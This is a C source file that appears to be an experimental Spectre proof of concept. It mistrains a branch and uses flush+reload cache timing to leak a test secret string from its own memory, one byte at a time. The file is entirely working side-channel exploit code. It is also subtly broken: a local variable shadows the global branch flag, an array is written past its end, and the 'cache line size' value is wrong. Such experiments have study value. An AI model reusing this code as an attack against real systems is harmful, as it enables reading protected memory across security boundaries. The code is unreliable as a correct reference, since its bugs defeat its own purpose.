

#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>
#include "../fr.h"
#define L3_CACHE_LINE_SIZE 16384

#define THRESHOLD 250
#define TRAIN_SIZE 50000


char buf[L3_CACHE_LINE_SIZE*255+1];
bool take = true;


char* secret = "This is going to be a very long prompt to test the flush and reload and make sure i got the cache line size correct";
void branch(char* a)
{
    if (take)
    {
        char data = *a;
        buf[*a * L3_CACHE_LINE_SIZE] = 1;
    }
    
}



void train()
{
    char a = 1;
    bool take = true;
    for (int i = 0; i < TRAIN_SIZE; i++)
    {
        flush(&take);
        branch(&a);
        flush(&take);
    }
    take = false;
    for (int j = 0; j < 255; j++)
        flush(&buf[j*L3_CACHE_LINE_SIZE]);
    flush(&take);
}


char spectre_read(char* secret, int offset)
{
    char c = 0x0;

    train();
    branch(secret + offset);

    for (int j = 0; j < 255; j++)
    {
        unsigned long timing;
        if ((timing = probe_timing(&buf[j*L3_CACHE_LINE_SIZE])) < THRESHOLD)
        {
            c = j;
            flush(&buf[j*L3_CACHE_LINE_SIZE]);
            //printf("Hit timing %d\n", timing);
            //printf("j: %d\n", j);
            break;
        }    
       // printf("Miss timing %d\n", timing); 
    }

    for (int j = 0; j < 255; j++)
        flush(&buf[j*L3_CACHE_LINE_SIZE]);

    return c;
}



int main(int argc, char** argv)
{
    
    


    char found_secret[strlen(secret)];
    found_secret[strlen(secret)] = 0;
    memset(found_secret, 0x0, strlen(secret));

    printf("\n\n");
    for (int i = 0; i < strlen(secret); i++)
    {
        char c1 = 0x0;
        c1 = spectre_read(secret, i);
        printf("%c", c1);
        found_secret[i] = c1;
       // break;
        //printf("Found Secret: %s\n", found_secret);
    }

    return 0;
}